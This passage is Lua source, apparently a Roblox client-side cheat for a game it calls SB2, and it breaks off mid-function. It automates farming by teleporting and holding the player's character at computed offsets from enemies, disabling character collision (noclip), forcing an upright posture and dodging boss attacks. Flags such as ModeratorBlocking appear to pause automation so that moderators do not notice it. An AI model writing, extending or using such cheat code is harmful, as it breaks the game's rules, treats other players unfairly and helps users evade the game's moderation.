local nextMovementUpdate = 0
local nextMovementStatusUpdate = 0
local lastSurfaceY, lastTeleportPosition, teleportTarget
local lastTeleportTime = 0
local correctionStrikes, correctionWindow = 0, 0
local correctionTarget
local targetMissingSince, nextAcquisition = nil, 0
local holdPaused = false
local offsetInitialized = false
local function movementStatus(message)
    state.MovementStatus = message
    if not state.AutoFarm and string.sub(message, 1, 7) == "Stopped" then state.LastFarmStopReason = message end
end
function state.SetTeleportOffset(value)
    if type(value)~="number"or value~=value or math.abs(value)==math.huge then return end
    local sign=state.OffsetMode=="Above"and 1 or -1
    local offset=sign*math.clamp(math.floor(math.abs(value)*10+.5)/10,1,sign>0 and 200 or 60)
    if offsetInitialized and offset==state.TeleportOffset then return end
    offsetInitialized=true;state.TeleportOffset=offset
    teleportTarget=nil;lastTeleportPosition=nil;lastTeleportTime=0;nextMovementUpdate=0
    correctionStrikes=0;correctionTarget=nil;state.OffsetGraceUntil=os.clock()+.4
end
local activeOffsetMob, offsetSample
state.OffsetAvoidTypes={}
state.AutoOffsetSolver=(function()
-- BEGIN BUNDLED AUTO OFFSET
-- Solve the vertical attack-sphere intersection before accepting body clearance.
return function(input)
    local enemy,player=input.Enemy,input.Player
    local dimensions=enemy.Size
    local widest=math.max(dimensions.X,dimensions.Z)
    local reach=math.min(120,input.Reach or widest*.5+20)
    local outer=math.min(widest*.5+19,reach-(input.Margin or 2))
    if outer<=0 then return nil,"No usable attack reach"end
    local center=input.Center or enemy.Position+Vector3.new(0,(player.Size.Y-dimensions.Y)*.5,0)
    local above=input.Mode=="Above"
    local minimum,destination,radius
    if above and input.AdaptiveAbove then
        minimum=(input.BodyAbove or dimensions.Y*.5)+(input.PlayerBelow or 3)+1.5
        local offset=math.min(200,math.max(minimum,center.Y-enemy.Position.Y+outer))
        radius=math.abs(offset-center.Y+enemy.Position.Y)
        if offset<minimum then return nil,"Above cap leaves no body clearance"end
        if radius>reach-.2 then return nil,"Above position is outside the learned hit range"end
        destination=Vector3.new(center.X,enemy.Position.Y+offset,center.Z)
    else
        local direction=above and 1 or -1
        local body=above and (input.BodyAbove or dimensions.Y*.5)or (input.BodyBelow or dimensions.Y*.5)
        local extent=above and (input.PlayerBelow or 3)or (input.PlayerAbove or 3)
        minimum=body+extent+1.5
        radius=outer;destination=center+Vector3.new(0,direction*radius,0)
        local offset=destination.Y-enemy.Position.Y
        local limited=math.clamp(offset,-60,200)
        if limited~=offset then
            destination=Vector3.new(destination.X,enemy.Position.Y+limited,destination.Z)
            radius=math.abs(destination.Y-center.Y)
            if radius>reach-(input.Margin or 2)then return nil,"Offset cap is outside attack reach"end
        end
        if (destination.Y-enemy.Position.Y)*direction<minimum then return nil,"No body clearance inside attack reach"end
    end
    if destination.Y<=(input.DestroyHeight or -500)+40 then return nil,"Offset crosses the map kill plane"end
    return {Destination=destination,Offset=destination.Y-enemy.Position.Y,Radius=radius,Reach=reach,
        Minimum=minimum,Center=center,Mode=above and "Above"or "Below"}
end

-- END BUNDLED AUTO OFFSET
end)()
function state.GetOffsetKey(mob,data)
    local mode=state.OffsetMode or "Below"
    if data.OffsetKeyMode~=mode or data.OffsetKeySize~=data.Root.Size then
        data.OffsetKey=tostring(game.PlaceId)..":"..mob.Name..":"..tostring(data.Root.Size)..":offset-v6:"..mode
        data.OffsetKeyMode,data.OffsetKeySize=mode,data.Root.Size
    end
    return data.OffsetKey
end
do
    local createTracker=(function()
-- BEGIN BUNDLED GROUND FOLLOW
-- Ground observations are independent from attack/root positions during native jumps.
return function(ctx)
    local api={}
    local observations=setmetatable({}, {__mode="k"})
    function api.Resolve(mob,data,now)
        local observation=observations[mob]
        if not observation then observation={ProbeAt=0};observations[mob]=observation end
        local root=data.Root
        local deleted=ctx.MapDeleted and ctx.MapDeleted()
        if now>=observation.ProbeAt then
            observation.ProbeAt=now+.2
            local floor=ctx.Floor(mob,data)
            if type(floor)=="number"then observation.Floor=floor end
        end
        if deleted then observation.Floor=nil end
        local floor=observation.Floor
        local native=ctx.GroundHint and ctx.GroundHint(mob)
        local humanoid=mob:FindFirstChildOfClass("Humanoid")
        local standing=math.max(data.BodyBelow or root.Size.Y*.5,root.Size.Y*.5+(humanoid and humanoid.HipHeight or 0))
        local at=root.Position
        local airborne=native~=nil or (floor~=nil and at.Y-floor>standing+7)or root.AssemblyLinearVelocity.Y>10
        if airborne then
            if not observation.Position then
                observation.Position=native or (floor and Vector3.new(at.X,floor+(observation.Standing or standing),at.Z))
            end
        else
            observation.Position=at
            if floor then observation.Standing=at.Y-floor end
        end
        return observation.Position or (not airborne and at or nil),airborne==true
    end
    return api
end

-- END BUNDLED GROUND FOLLOW
    end)()
    local module=services:FindFirstChild("EnemySkills")
    state.NativeEnemySkills=module and require(module)
    local groundParams=RaycastParams.new()
    groundParams.FilterType=Enum.RaycastFilterType.Exclude;groundParams.RespectCanCollide=true
    local function ground(mob,data)
        local excluded={mob}
        for _,name in ipairs({"Mobs","Characters","CharacterItems","HitEffects"})do
            local object=workspace:FindFirstChild(name);if object then excluded[#excluded+1]=object end
        end
        if player.Character then excluded[#excluded+1]=player.Character end
        groundParams.FilterDescendantsInstances=excluded
        local hit=workspace:Raycast(data.Root.Position+Vector3.new(0,32,0),Vector3.new(0,-2048,0),groundParams)
        return hit and hit.Normal.Y>.6 and hit.Position.Y or nil
    end
    state.GroundFollow=createTracker({Floor=ground,
        MapDeleted=function()return state.PerformanceBoosters["Delete map"]or state.PerformanceBoosters["Remove everything"]end,
        GroundHint=function(mob)
            local native=state.NativeEnemySkills
            local rig=native and native.RiggedEnemies and native.RiggedEnemies[mob]
            local cast=rig and rig.ActiveSkills and rig.ActiveSkills.LavaSmash
            if cast and not cast.Destroyed then return cast.LastCFrame and cast.LastCFrame.Position or cast.SurfacePosition end
        end})
end
function state.ResolveAutoOffset(mob)
    state.FixedFarmPosition=nil
    local data=getMobData(mob)
    local character=player.Character
    local root=character and character:FindFirstChild("HumanoidRootPart")
    if not data or not root then return nil end
    if state.AutoFarm and game.PlaceId==6144637080 and mob.Name=="Suspended Unborn"then
        local destination=Vector3.new(-2439,70,5389)
        if state.FarmCoordination then destination=state.FarmCoordination.Spread(destination,mob)end
        activeOffsetMob,offsetSample=nil,nil
        state.FixedFarmPosition=destination;state.AutoOffsetTarget=mob;state.AutoOffsetDestination=destination
        state.FarmTargetAirborne=false;state.TeleportOffset=destination.Y-data.Root.Position.Y
        state.OffsetStatus="Suspended Unborn · fixed arena position +10 studs"
        data.LastGroundedFarmDestination=destination
        return state.TeleportOffset
    end
    local now,mobRoot=os.clock(),data.Root
    local key=state.GetOffsetKey(mob,data)
    local function measureBody()
        if data.BodyBelow and data.BodyAbove and data.OffsetRootSize==mobRoot.Size then return end
        local lower,upper=-mobRoot.Size.Y/2,mobRoot.Size.Y/2
        local bound=math.max(12,mobRoot.Size.Magnitude*2)
        local ignore={"hitbox","effect","attack","trail","weapon","sword","blade"}
        for _,part in ipairs(mob:QueryDescendants("BasePart"))do
            local usable=part.Transparency<.95 and (part.Position-mobRoot.Position).Magnitude<=bound
                and part.Name:lower()~="handle"and not part:FindFirstAncestorWhichIsA("Tool")and not part:FindFirstAncestorWhichIsA("Accessory")
            if usable then
                for _,word in ipairs(ignore)do if part.Name:lower():find(word,1,true)then usable=false;break end end
            end
            if usable then
                local frame,size=part.CFrame,part.Size
                local extent=(math.abs(frame.RightVector.Y)*size.X+math.abs(frame.UpVector.Y)*size.Y+math.abs(frame.LookVector.Y)*size.Z)/2
                local height=part.Position.Y-mobRoot.Position.Y
                lower=math.min(lower,height-extent);upper=math.max(upper,height+extent)
            end
        end
        data.BodyBelow=-lower;data.BodyAbove=upper;data.OffsetRootSize=mobRoot.Size
    end
    measureBody()
    local grounded,airborne=state.GroundFollow.Resolve(mob,data,now)
    state.FarmTargetAirborne=airborne
    if airborne then
        local frozen=data.LastGroundedFarmDestination or (state.FarmAbove and root.Position)
            or (grounded and Vector3.new(grounded.X,grounded.Y-data.BodyBelow-20,grounded.Z))or root.Position
        state.AutoOffsetTarget=mob;state.AutoOffsetDestination=frozen;state.OffsetStatus="Waiting for enemy to land"
        return frozen.Y-mobRoot.Position.Y
    end
    local shared=state.AutoFarm and state.FarmCoordination
    local head=character:FindFirstChild("Head")
    local humanoid=character:FindFirstChildOfClass("Humanoid")
    local center=shared and mobRoot.Position+Vector3.new(0,(2-mobRoot.Size.Y)*.5,0)or root.Position+state.AutoRanges.Delta(data,root)
    local mode=shared and "Below"or state.OffsetMode or "Below"
    local kind=state.Enabled and "Kill"or "Skill"
    local reach=shared and state.AutoRanges.BodyRange(data)or (state.FarmAbove and state.AutoRanges.Range(kind,data,state.SelectedSkill)or state.AutoRanges.BodyRange(data))
    local plan,reason=state.AutoOffsetSolver({Enemy=mobRoot,Player=shared and {Size=Vector3.new(2,2,1)}or root,Center=center,
        Mode=mode,Reach=reach,Margin=shared and 3 or 1.5+math.min(1,(state.PingMs or 150)/500),AdaptiveAbove=not shared and state.FarmAbove,
        BodyBelow=data.BodyBelow,BodyAbove=data.BodyAbove,PlayerAbove=shared and 3 or (head and math.max(root.Size.Y/2,head.Position.Y+head.Size.Y/2-root.Position.Y)or 3),
        PlayerBelow=shared and 3 or math.max(3,humanoid and humanoid.HipHeight+root.Size.Y/2 or 3),DestroyHeight=workspace.FallenPartsDestroyHeight})
    if plan and not shared and plan.Radius>state.AutoRanges.Range(kind,data,state.SelectedSkill)-(state.FarmAbove and .2 or 1)then plan=nil;reason="Outer position exceeds the learned attack reach"end
    if not plan then
        state.AutoOffsetTarget=nil;state.AutoOffsetDestination=nil;state.OffsetStatus=reason
        if not shared then data.SkipUntil=now+8;state.LastOffsetRejected={Target=mob.Name,Reason=reason,At=now};if state.FollowTarget==mob then state.FollowTarget=nil end end
        return nil
    end
    if shared then
        local destination=state.FarmCoordination.Spread(plan.Destination,mob,center,plan.Reach)
        state.AutoOffsetTarget=mob;state.AutoOffsetDestination=destination;data.LastGroundedFarmDestination=destination
        activeOffsetMob,offsetSample=nil,nil;state.TeleportOffset=destination.Y-mobRoot.Position.Y
        state.OffsetStatus="Separated farm hold · slot "..tostring(state.FarmCoordination.Slot or 1)
        return state.TeleportOffset
    end
    local entity=character:FindFirstChild("Entity")
    local health=entity and entity:FindFirstChild("Health")
    if activeOffsetMob~=mob or not offsetSample or offsetSample.Key~=key then
        activeOffsetMob=mob;offsetSample={Key=key,Offset=plan.Offset,At=now,SafeSince=now,Requests=data.OffsetRequests or 0,
            PlayerHealth=health and health.Value,OwnDamage=state.ReadOwnDamage(data.Health),Misses=0,Confirmed=false}
    end
    local sample=offsetSample
    if math.abs(plan.Offset-sample.Offset)>.75 then sample.SafeSince=now;sample.Confirmed=false;sample.Offset=plan.Offset end
    state.OffsetStatus="Source outer reach · checking clearance"
    if now-sample.At>=1.2 then
        local requests=data.OffsetRequests or 0
        local own=state.ReadOwnDamage(data.Health)
        if requests>sample.Requests and own~=nil and own>(sample.OwnDamage or 0)then
            sample.Misses=0
            local safe=now-(state.LastIncomingDamageAt or -math.huge)>=4 and (not health or not sample.PlayerHealth or health.Value>=sample.PlayerHealth)
            if safe and now-sample.SafeSince>=4 then
                sample.Confirmed=true;state.OffsetStatus="Holding damage-free source position"
                local value=(plan.Mode=="Above"and 1 or -1)*math.floor(math.abs(plan.Offset)*4+.5)/4
                if state.OffsetProfiles[key]~=value and now-(data.LastProfileSaveAt or -math.huge)>=10 then
                    local count=0;for _ in pairs(state.OffsetProfiles)do count+=1 end
                    if count<32 or state.OffsetProfiles[key]then state.OffsetProfiles[key]=value;data.LastProfileSaveAt=now;requestSave()end
                end
            else state.OffsetStatus="Checking damage and player health"end
        elseif requests-sample.Requests>=3 and not state.SkillCastRunning and not state.Recovering and now>=state.LagPauseUntil and (not state.PingMs or state.PingMs<=500)then
            sample.Misses+=1;state.OffsetStatus="No damage · holding outer clearance"
            if sample.Misses>=3 then data.SkipUntil=now+8;state.FollowTarget=nil;state.AutoOffsetTarget=nil;state.AutoOffsetDestination=nil;return nil end
        end
        sample.Requests=requests;sample.At=now;sample.OwnDamage=own;sample.PlayerHealth=health and health.Value
    end
    state.OffsetDebug={Target=mob.Name,Mode=plan.Mode,Distance=math.abs(plan.Offset),Minimum=plan.Minimum,Radius=plan.Radius,Reach=plan.Reach,
        CenterCorrection=center.Y-mobRoot.Position.Y,BodyBelow=data.BodyBelow,BodyAbove=data.BodyAbove,MissWindows=sample.Misses,Confirmed=sample.Confirmed}
    state.AutoOffsetTarget=mob;state.AutoOffsetDestination=plan.Destination;data.LastGroundedFarmDestination=plan.Destination
    state.SetTeleportOffset(plan.Offset);return plan.Offset
end

local function attackDeltaFor(data,root)
    if state.AutoRanges then return state.AutoRanges.Delta(data,root)end
    local center=data.Root.Position+Vector3.new(0,(root.Size.Y-data.Root.Size.Y)*.5,0)
    return center-root.Position
end
local function attackRadiusFor(mob)
    local data=getMobData(mob)
    if not data then return 20 end
    return state.AutoRanges and state.AutoRanges.Range("Kill",data)or math.min(120,math.max(data.Root.Size.X,data.Root.Size.Z)*.5+20)
end
local farmTween
local farmTweenInfo=TweenInfo.new(0,Enum.EasingStyle.Linear)
local function clearFarmTween()
    if farmTween then farmTween:Cancel();farmTween:Destroy();farmTween=nil end
end
local function rootFrameAt(root,point)
    local direction=root.CFrame.LookVector*Vector3.new(1,0,1)
    if direction.Magnitude<.001 then direction=Vector3.new(0,0,-1)end
    return CFrame.lookAt(point,point+direction.Unit,Vector3.yAxis)
end
local function pivotRoot(root,position)
    clearFarmTween();if releaseStartupHold then releaseStartupHold(false)end
    local character=root.Parent
    character:PivotTo(rootFrameAt(root,position)*root.CFrame:ToObjectSpace(character:GetPivot()))
    root.AssemblyLinearVelocity=Vector3.zero;root.AssemblyAngularVelocity=Vector3.zero
end
local function tweenFarmRoot(root,position)
    clearFarmTween();if releaseStartupHold then releaseStartupHold(false)end
    root.AssemblyLinearVelocity=Vector3.zero;root.AssemblyAngularVelocity=Vector3.zero
    farmTween=TweenService:Create(root,farmTweenInfo,{CFrame=rootFrameAt(root,position)});farmTween:Play()
end
stopMovement = function(message,keepPosition)
    local floated=state.ArenaFloat and state.ArenaFloat.Root
    if state.ArenaFloat then state.ArenaFloat.Release()end
    state.TravelHold=false;state.TravelHoldPosition=nil
    if state.Recovering and not movementRoot then return end
    if characterPartConnection then characterPartConnection:Disconnect();characterPartConnection=nil end
    local root=movementRoot or floated
    local humanoid=movementHumanoid or (root and root.Parent and root.Parent:FindFirstChildOfClass("Humanoid"))
    local rotate,platform=previousAutoRotate,previousPlatformStand
    local align,orientation,attachment=positionAlign,orientationAlign,movementAttachment
    local collisions=collisionParts;collisionParts={}
    local function finish()
        if align then align:Destroy()end
        if orientation then orientation:Destroy()end
        if attachment then attachment:Destroy()end
        for part,value in pairs(collisions)do if part.Parent then part.CanCollide=value end end
        if humanoid and humanoid.Parent then
            humanoid.AutoRotate=rotate~=false;humanoid.PlatformStand=platform==true
            if humanoid.Health>0 and not platform then humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)end
        end
        if root and root.Parent then root.AssemblyLinearVelocity=Vector3.zero end
        state.Recovering=false
    end
    local exit
    if not keepPosition and root and root.Parent and (align or floated)and humanoid and humanoid.Health>0 then
        local params=RaycastParams.new();params.FilterType=Enum.RaycastFilterType.Exclude;params.RespectCanCollide=true
        params.FilterDescendantsInstances={root.Parent,workspace:FindFirstChild("Mobs")or root.Parent}
        local hit=workspace:Raycast(root.Position+Vector3.new(0,35,0),Vector3.new(0,-70,0),params)
        local elevation=hit and hit.Position.Y+humanoid.HipHeight+root.Size.Y/2+1.5 or lastSurfaceY
        if elevation and math.abs(root.Position.Y-elevation)>1 then exit=Vector3.new(root.Position.X,elevation,root.Position.Z)end
    end
    if exit then
        pivotRoot(root,exit)
        if align then
            state.Recovering=true;align.Enabled=true;align.Position=exit
            local physics=RunService.Stepped:Connect(function()for part in pairs(collisions)do if part.Parent then part.CanCollide=false end end end)
            env.SB2FarmRecoveryUntil=os.clock()+.3
            task.delay(.3,function()
                physics:Disconnect();finish()
                if state.Running then movementStatus(state.LastFarmStopReason or message or "Stopped · character controls restored")end
            end)
        else finish()end
    else finish()end
    movementRoot=nil;movementHumanoid=nil;previousAutoRotate=nil;previousPlatformStand=nil
    movementAttachment=nil;positionAlign=nil;orientationAlign=nil
    lastTeleportPosition=nil;teleportTarget=nil;correctionTarget=nil;correctionStrikes=0;holdPaused=false
    state.Exploring=false;state.LastExploreDestination=nil;state.Moving=false
    if message then movementStatus(state.Recovering and "Returning above ground…"or message)end
end

do
    local make=(function()
-- BEGIN BUNDLED FARM NOCLIP
-- Character-scoped collision ownership survives farm/travel handoffs and respawns.
return function(ctx)
    local api={}
    local ledger={}
    local owner,partsAdded,physics
    local closed=false
    local function restorePart(part)
        local value=ledger[part]
        ledger[part]=nil
        if part.Parent then part.CanCollide=value end
    end
    local function detach()
        if partsAdded then partsAdded:Disconnect();partsAdded=nil end
        for part in pairs(ledger)do restorePart(part)end
        owner=nil
    end
    local function claim(part)
        if not part:IsA("BasePart")then return end
        if ledger[part]==nil then ledger[part]=part.CanCollide end
        part.CanCollide=false
    end
    function api.Original(part)return ledger[part]end
    function api.Update()
        if closed then return end
        if not ctx.Enabled()then
            detach();if physics then physics:Disconnect();physics=nil end;return
        end
        local current=ctx.Player.Character
        if current~=owner then
            detach();owner=current
            if owner then
                for _,part in ipairs(owner:QueryDescendants("BasePart"))do claim(part)end
                partsAdded=owner.DescendantAdded:Connect(claim)
            end
        end
        for part in pairs(ledger)do
            if not part.Parent then ledger[part]=nil
            elseif owner and not part:IsDescendantOf(owner)then restorePart(part)
            else part.CanCollide=false end
        end
        if not physics then physics=ctx.Pulse:Connect(api.Update)end
    end
    function api.Destroy()
        if closed then return end
        closed=true
        if physics then physics:Disconnect();physics=nil end
        detach()
    end
    return api
end

-- END BUNDLED FARM NOCLIP
    end)()
    state.FarmNoclip=make({Player=player,Pulse=RunService.Stepped,
        Enabled=function()return state.Running and state.AutoFarm and not state.StopEverything and not state.ModeratorBlocking end})
end
function state.SetAutoFarm(enabled,reason)
    enabled=enabled==true
    if (state.StopEverything and enabled)or enabled==state.AutoFarm then return end
    state.LastAutoFarmChange={Enabled=enabled,Reason=reason or "API",At=os.clock(),Line=debug.info(2,"l")}
    if state.AutoFarm and not enabled then state.ProtectionUntil=os.clock()+8 end
    state.AutoFarm=enabled;state.FarmTargetLock=nil;state.LastMovementError=nil
    if enabled then state.LastFarmStopReason=nil end
    farmToggle.Text=enabled and "Auto farm  ·  ON"or "Auto farm  ·  OFF"
    farmToggle.BackgroundColor3=enabled and Color3.fromRGB(114,88,229)or Color3.fromRGB(45,48,63)
    stopMovement(enabled and "Searching for the nearest living mob"or "Auto farm is off")
    state.FollowTarget=nil;activeOffsetMob=nil;offsetSample=nil;state.AutoOffsetTarget=nil
    nextTargetRefresh=0;nextMovementUpdate=0;targetMissingSince=nil;nextAcquisition=0
    if enabled and state.SetEnabled then
        local character=player.Character;local humanoid=character and character:FindFirstChildOfClass("Humanoid")
        if humanoid then humanoid:Move(Vector3.zero,false)end
    end
    if state.FarmNoclip then state.FarmNoclip.Update()end
    requestSave()
end
function state.SetBossOnly(enabled)
    state.BossOnly=enabled==true;state.FarmTargetLock=nil;state.FollowTarget=nil;state.FarmPriorityTarget=nil
    state.MultiSpotEncounter={};state.MultiSpotNextScan=0;nextTargetRefresh=0;nextAcquisition=0;nextMovementUpdate=0
    requestSave()
end
function state.SetFarmRange(value)
    state.FarmRange=math.huge;state.FollowTarget=nil;nextTargetRefresh=0;nextMovementUpdate=0
    movementStatus("Detection range updated");requestSave()
end
bind(farmToggle.Activated,function()state.SetAutoFarm(not state.AutoFarm,"UI toggle")end)
state.SetAutoFarm(false)
refreshMobIndex()
function state.SetBossOnly(on)
    state.BossOnly=on==true;state.FarmTargetLock=nil;state.FollowTarget=nil;state.FarmPriorityScanAt=0;nextAcquisition=0;requestSave()
end
local selectedFarmSpot=(function()
-- BEGIN BUNDLED SELECTED FARM SPOTS
-- Selected encounters are an admission policy, independent of local target locks.
return function(state,mobName,point,priority,place)
    if state.AccountProgression or not state.MultiSpot then return true end
    local catalog=state.AutomationCatalog
    if not catalog then return false end
    local canonical=tostring(mobName):lower()
    for id,enabled in pairs(state.MultiSpotSelected or {})do
        local entry=enabled and catalog.SpotById[id]
        if entry and entry.PlaceId==place then
            if entry.EncounterNames and priority<=2 then
                for name in pairs(entry.EncounterNames)do if name:lower()==canonical then return true end end
            elseif point and entry.Position then
                local squared=0
                for _,axis in ipairs({"X","Y","Z"})do local delta=point[axis]-entry.Position[axis];squared+=delta*delta end
                if squared<=48400 then return true end
            end
        end
    end
    return false
end

-- END BUNDLED SELECTED FARM SPOTS
end)()
function state.IsSelectedFarmMob(mob,data)
    if not state.MultiSpot or state.AccountProgression then return true end
    local root=data and data.Root or mob:FindFirstChild("HumanoidRootPart")or mob.PrimaryPart or mob:FindFirstChild("RootPart")
    return selectedFarmSpot(state,mob.Name,root and root.Position,targetPriority.Rank(mob),game.PlaceId)
end
local function validMob(mob, mobs)
    if state.ModeratorBlocking or state.AutoTradeBusy or not mob or mob.Parent~=mobs then return nil end
    local data=getMobData(mob)
    if not data then return nil end
    if data.Health.Value<=0 or (data.HitLives and data.HitLives.Value<=0)or data.Entity:FindFirstChild("Immortal")then return nil end
    if not state.BlackoutHolding then
        local rank=targetPriority.Rank(mob)
        if state.AutoFarm and state.BossOnly and rank>2 then return nil end
        if state.AccountProgression and (state.ProgressionPhase~="Fighting"or state.ProgressionEquipping or mob~=state.ProgressionBossMob)then return nil end
        if state.AutoFarm and state.MultiSpot and not state.IsSelectedFarmMob(mob,data)then return nil end
        local inEncounter=state.MultiSpotEncounter and state.MultiSpotEncounter[mob]
        if state.MultiSpotAnchor and not (state.AutoFarm and rank<=2)and not inEncounter and (data.Root.Position-state.MultiSpotAnchor).Magnitude>220 then return nil end
    end
    if os.clock()<(data.SkipUntil or 0)then return nil end
    return data.Root
end
function state.IsFarmEnemyAlive()
    if not state.AutoFarm then return false end
    local target=state.FarmTargetLock or state.FollowTarget
    if not target or target.Parent~=refreshMobIndex()then return false end
    local data=getMobData(target)
    if state.MultiSpot and not state.IsSelectedFarmMob(target,data)then return false end
    return not data or data.Health.Value>0 and (not data.HitLives or data.HitLives.Value>0)
end
function state.GetFarmPriorityTarget(now)
    if not state.AutoFarm or state.Running==false or state.AccountProgression or state.StopEverything or state.SafeModePanic or state.AutomationTeleporting or state.ModeratorBlocking or state.AutoTradeBusy then return nil end
    local folder=refreshMobIndex()
    if not folder then return nil end
    local cached=state.FarmPriorityTarget
    if now<(state.FarmPriorityScanAt or 0)and (not cached or validMob(cached,folder))then return cached end
    state.FarmPriorityScanAt=now+.15
    local candidate
    for mob in pairs(trackedMobs)do
        if targetPriority.Rank(mob)<=2 and validMob(mob,folder)and (not candidate or targetPriority.FarmLess(mob,candidate))then candidate=mob end
    end
    if cached and cached.Parent==folder and targetPriority.Rank(cached)<=2 and (not state.MultiSpot or state.IsSelectedFarmMob(cached))then
        local data=getMobData(cached)
        local living=not data or data.Health.Value>0 and (not data.HitLives or data.HitLives.Value>0)
        if living and (not candidate or targetPriority.Rank(cached)<targetPriority.Rank(candidate))then candidate=cached end
    end
    state.FarmPriorityTarget=candidate;return candidate
end
function state.IsAttackingEnemy()
    if not state.Running or state.StopEverything or state.SafeModePanic or state.TravelBusy or state.MultiSpotOwnsTravel or state.Dodging or state.Recovering or state.ProtectionRetreating then return false end
    if not state.LastEnemyAttackAt or os.clock()-state.LastEnemyAttackAt>.8 then return false end
    local normal=state.LastEnemyAttackKind=="Normal"
    if not ((normal and state.Enabled)or (state.LastEnemyAttackKind=="Skill"and state.SkillAura))then return false end
    local target=state.LastEnemyAttackTarget
    if not validMob(target,indexedMobFolder)then return false end
    local character=player.Character;local root=character and character:FindFirstChild("HumanoidRootPart")
    local entity=character and character:FindFirstChild("Entity");local health=entity and entity:FindFirstChild("Health")
    if not root or not health or health.Value<=0 then return false end
    local data=getMobData(target)
    local radius=normal and attackRadiusFor(target)or state.AutoRanges.Range("Skill",data,state.LastEnemyAttackSkill)
    return attackDeltaFor(data,root).Magnitude<=radius
end
local function pauseHold(message)
    if not holdPaused and movementRoot and movementRoot.Parent and positionAlign then positionAlign.Position=movementRoot.Position end
    holdPaused=true;movementStatus(message)
end
local function clearStaleFarmControllers(root)
    local names={SB2FarmPosition="AlignPosition",SB2FarmOrientation="AlignOrientation",SB2FarmAttachment="Attachment"}
    for _,object in ipairs(root:GetChildren())do local class=names[object.Name];if class and object:IsA(class)then object:Destroy()end end
end
local function ensureMovementController(character, root, humanoid, destination)
    if releaseStartupHold then releaseStartupHold(false)end
    if state.ArenaFloat and state.ArenaFloat.Root then state.ArenaFloat.Release()end
    if movementRoot==root and positionAlign and positionAlign.Parent then return end
    clearStaleFarmControllers(root)
    movementRoot=root;movementHumanoid=humanoid;previousAutoRotate=humanoid.AutoRotate;previousPlatformStand=humanoid.PlatformStand
    humanoid.AutoRotate=false;humanoid.PlatformStand=false;humanoid.Sit=false;humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
    local function collision(part)
        if not part:IsA("BasePart")then return end
        if collisionParts[part]==nil then
            local original=state.FarmNoclip and state.FarmNoclip.Original(part)
            if original==nil then original=part.CanCollide end
            collisionParts[part]=original
        end
        part.CanCollide=false
    end
    for _,part in ipairs(character:QueryDescendants("BasePart"))do collision(part)end
    characterPartConnection=character.DescendantAdded:Connect(collision)
    movementAttachment=create("Attachment",{Name="SB2FarmAttachment"},root)
    local mass=math.max(1,root.AssemblyMass)
    positionAlign=create("AlignPosition",{Name="SB2FarmPosition",Mode=Enum.PositionAlignmentMode.OneAttachment,
        Attachment0=movementAttachment,Position=destination,ApplyAtCenterOfMass=true,MaxForce=mass*workspace.Gravity*8,
        MaxVelocity=60,Responsiveness=40,RigidityEnabled=false},root)
    orientationAlign=create("AlignOrientation",{Name="SB2FarmOrientation",Mode=Enum.OrientationAlignmentMode.OneAttachment,
        Attachment0=movementAttachment,CFrame=state.UprightController.Rotation(root.CFrame),MaxTorque=mass*10000,
        MaxAngularVelocity=20,Responsiveness=40,RigidityEnabled=true},root)
    state.Moving=true
end

state.UprightController=(function()
-- BEGIN BUNDLED UPRIGHT
-- Posture control has an explicit humanoid-state restoration ledger.
return function(ctx)
    local api={}
    local owner,states
    local due=0
    function api.Rotation(frame)
        local flat=frame.LookVector*Vector3.new(1,0,1)
        local forward=flat.Magnitude>=.001 and flat.Unit or Vector3.new(0,0,-1)
        return CFrame.lookAt(Vector3.zero,forward,Vector3.yAxis)
    end
    function api.Release()
        local humanoid,ledger=owner,states
        owner,states=nil,nil
        if humanoid and humanoid.Parent and ledger then
            for state,wasEnabled in pairs(ledger)do humanoid:SetStateEnabled(state,wasEnabled)end
        end
    end
    local function acquire(humanoid)
        if owner==humanoid then return end
        api.Release();owner=humanoid;states={}
        for _,state in ipairs({Enum.HumanoidStateType.FallingDown,Enum.HumanoidStateType.Ragdoll})do
            states[state]=humanoid:GetStateEnabled(state);humanoid:SetStateEnabled(state,false)
        end
    end
    function api.Update(force)
        local now=os.clock()
        if not force and now<due then return end
        due=now+.1
        local character=ctx.Player.Character
        local root=character and character:FindFirstChild("HumanoidRootPart")
        local humanoid=character and character:FindFirstChildOfClass("Humanoid")
        if not ctx.Controlled()or not root or not humanoid or humanoid.Health<=0 then api.Release();return end
        acquire(humanoid)
        humanoid.PlatformStand=false;humanoid.Sit=false
        local current=humanoid:GetState()
        for _,bad in ipairs({Enum.HumanoidStateType.Physics,Enum.HumanoidStateType.FallingDown,Enum.HumanoidStateType.Ragdoll,Enum.HumanoidStateType.Seated})do
            if current==bad then humanoid:ChangeState(Enum.HumanoidStateType.GettingUp);break end
        end
        local rotation=api.Rotation(root.CFrame)
        local align=ctx.Orientation()
        if align and align.Parent then align.CFrame=rotation;align.Enabled=true end
        if root.CFrame.UpVector.Y<.999 then
            root.CFrame=CFrame.new(root.Position)*rotation
            ctx.State.UprightCorrections=(ctx.State.UprightCorrections or 0)+1
            root.AssemblyAngularVelocity=Vector3.zero
        elseif root.AssemblyAngularVelocity.Magnitude>.1 then root.AssemblyAngularVelocity=Vector3.zero end
    end
    api.Destroy=api.Release
    return api
end

-- END BUNDLED UPRIGHT
end)()({State=state,Player=player,
    Controlled=function() return state.Running and (state.AutoFarm or state.TravelBusy or state.TravelHold or state.Dodging) end,
    Orientation=function() return orientationAlign end,
})

do
    local buildWarnings=(function()
-- BEGIN BUNDLED BOSS DODGE
-- Native warning discovery feeds bounded geometry snapshots and a reusable escape search.
return function(ctx)
    local api={ThreatCount=0}
    local warnings,bindings={},{}
    local snapshots={}
    local castWindows={}
    local cone
    local closed=false
    local escape={Point=nil,Until=0,SearchAt=0}
    local labels={RedGroundWarning="Circle",LockedAimWarning="Beam"}
    local tags={"AegorSlam Rock","AegorSlam Slam","AegorSpike Spike","RiftDetonation Rift"}
    local final=ctx.FinalWave
    local wave=ctx.RubricatusWave or {}
    local laserColor=final and Color3.fromRGB(255,18,38)
    local function bind(signal,fn)bindings[#bindings+1]=signal:Connect(fn)end
    local function register(object,kind,name,radius)
        if closed then return end
        local entry=warnings[object]
        if not entry then
            local count=0;for _ in pairs(warnings)do count+=1 end
            if count>=48 then return end
            entry={Kind=kind,Started=os.clock(),Name=name or object.Name};warnings[object]=entry
        end
        entry.Radius=radius or entry.Radius;api.HasHazards=true
    end
    local function projectile(object)
        for _,spec in ipairs(ctx.Projectiles or {})do
            local template=spec.Template
            local matches=template and object.ClassName==template.ClassName and object.Name==template.Name
                and object.Material==template.Material and object.Color==template.Color
